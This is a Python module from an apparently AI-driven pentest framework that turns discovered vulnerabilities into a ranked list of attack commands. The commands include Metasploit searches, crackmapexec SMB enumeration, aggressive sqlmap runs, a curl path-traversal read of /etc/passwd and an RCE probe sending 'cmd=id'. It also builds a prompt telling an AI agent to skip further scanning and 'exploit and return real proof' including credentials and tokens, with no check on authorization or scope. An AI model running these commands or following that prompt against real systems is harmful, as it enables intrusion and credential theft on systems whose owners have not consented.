"""kali-executor/open-interpreter/exploitation_injector.py

Sprint 1: Proactive Command Injection.

This module generates a small, prioritized set of exploitation commands based on
structured findings (vulns/services) already discovered.

Design goals:
- Best-effort only; safe to disable.
- Keep output concise.
- Avoid dependency bloat.
"""

from __future__ import annotations

import logging
import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urlparse

logger = logging.getLogger(__name__)


_CVE_RE = re.compile(r"\b(CVE-\d{4}-\d{4,7})\b", re.IGNORECASE)


def _parse_target(target: str) -> Tuple[str, int, str]:
    """Return (host, port, url) best-effort."""

    raw = str(target or "").strip()
    if not raw:
        return ("", 0, "")

    if raw.startswith("http://") or raw.startswith("https://"):
        try:
            u = urlparse(raw)
            host = u.hostname or ""
            port = int(u.port or (443 if u.scheme == "https" else 80))
            base = f"{u.scheme}://{u.netloc}" if u.scheme and u.netloc else raw
            return (host, port, base)
        except Exception:
            return (raw, 0, raw)

    # host:port
    if ":" in raw and "//" not in raw:
        host, maybe_port = raw.split(":", 1)
        try:
            port = int(maybe_port)
        except Exception:
            port = 0
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{host}:{port}" if port else f"{scheme}://{host}"
        return (host, port, url)

    host = raw
    return (host, 0, f"http://{host}")


def _priority_rank(val: str) -> int:
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    return int(order.get(str(val or "medium").lower().strip(), 2))


class ExploitationInjector:
    def __init__(self, max_items: int = 6):
        self.max_items = int(max_items or 6)

    def generate_plan(self, findings: List[Dict[str, Any]], target: str) -> List[Dict[str, Any]]:
        plan: List[Dict[str, Any]] = []
        seen_cmds = set()
        seen_ports = set()

        for f in findings or []:
            if not isinstance(f, dict):
                continue
            if f.get("exploited"):
                continue
            if (f.get("not_exploitable_reason") or "").strip():
                continue

            vtype = str(f.get("type") or "").lower()
            details = str(f.get("details") or "")
            f_target = str(f.get("target") or target or "").strip()

            host, port, url = _parse_target(f_target)

            # CVE-guided first (high signal)
            cve = ""
            m = _CVE_RE.search(details) or _CVE_RE.search(vtype)
            if m:
                cve = m.group(1).upper()
            if cve:
                cmd = f"msfconsole -q -x 'search {cve}; exit'"
                if cmd not in seen_cmds:
                    plan.append(
                        {
                            "tool": "msfconsole",
                            "command": cmd,
                            "rationale": f"CVE identified ({cve}) â€” check Metasploit modules quickly",
                            "fallback": f"searchsploit {cve}",
                            "priority": "high",
                        }
                    )
                    seen_cmds.add(cmd)

            # SMB
            if port == 445 or "smb" in vtype:
                if 445 not in seen_ports and host:
                    seen_ports.add(445)
                    cmd = f"crackmapexec smb {host} --shares"
                    if cmd not in seen_cmds:
                        plan.append(
                            {
                                "tool": "crackmapexec",
                                "command": cmd,
                                "rationale": "SMB exposed â€” enumerate shares and access paths",
                                "fallback": f"smbclient -L //{host} -N",
                                "priority": "high",
                            }
                        )
                        seen_cmds.add(cmd)

            # Web
            if port in (80, 443, 8080, 8443) or any(k in vtype for k in ("http", "https", "web")):
                if port and port not in seen_ports:
                    seen_ports.add(port)
                if host and url:
                    if "sql" in vtype or "sqli" in vtype:
                        cmd = f"sqlmap -u '{url}/' --batch --forms --crawl=2 --level=3 --risk=2"
                        if cmd not in seen_cmds:
                            plan.append(
                                {
                                    "tool": "sqlmap",
                                    "command": cmd,
                                    "rationale": "Web target + SQL signal â€” attempt automated confirmation",
                                    "fallback": f"nuclei -u {url} -severity critical,high",
                                    "priority": "critical",
                                }
                            )
                            seen_cmds.add(cmd)

            # LFI/path traversal
            if any(k in vtype for k in ("lfi", "file inclusion", "path traversal", "traversal")) and url:
                cmd = f"curl -s '{url}/../../../../etc/passwd' | head"
                if cmd not in seen_cmds:
                    plan.append(
                        {
                            "tool": "curl",
                            "command": cmd,
                            "rationale": "LFI/path traversal signal â€” attempt file read proof",
                            "fallback": None,
                            "priority": "high",
                        }
                    )
                    seen_cmds.add(cmd)

            # RCE/command injection
            if any(k in vtype for k in ("rce", "command injection", "cmdi", "remote code execution")) and url:
                cmd = f"curl -s '{url}' --data 'cmd=id'"
                if cmd not in seen_cmds:
                    plan.append(
                        {
                            "tool": "curl",
                            "command": cmd,
                            "rationale": "RCE/cmd injection signal â€” attempt direct proof (id/whoami)",
                            "fallback": None,
                            "priority": "critical",
                        }
                    )
                    seen_cmds.add(cmd)

            if len(plan) >= self.max_items:
                break

        plan.sort(key=lambda p: (_priority_rank(p.get("priority")), str(p.get("tool") or "")))
        return plan[: self.max_items]

    def format_injection_prompt(self, plan: List[Dict[str, Any]]) -> str:
        if not plan:
            return ""

        lines = [
            "ðŸŽ¯ PROACTIVE EXPLOITATION PLAN (based on current findings):",
            "Provide ONE command per response; prefer the highest-priority item.",
            "",
        ]

        for i, p in enumerate(plan[: self.max_items], 1):
            tool = str(p.get("tool") or "").strip().upper()
            cmd = str(p.get("command") or "").strip()
            rationale = str(p.get("rationale") or "").strip()
            fallback = str(p.get("fallback") or "").strip()

            if not tool or not cmd:
                continue

            lines.append(f"{i}. {tool} â†’ `{cmd}`")
            if rationale:
                lines.append(f"   Reason: {rationale}")
            if fallback:
                lines.append(f"   Fallback: {fallback}")
            lines.append("")

        lines.append("Do NOT scan again. Exploit and return real proof (data, shell output, file contents, creds/tokens).")
        return "\n".join(lines).strip()
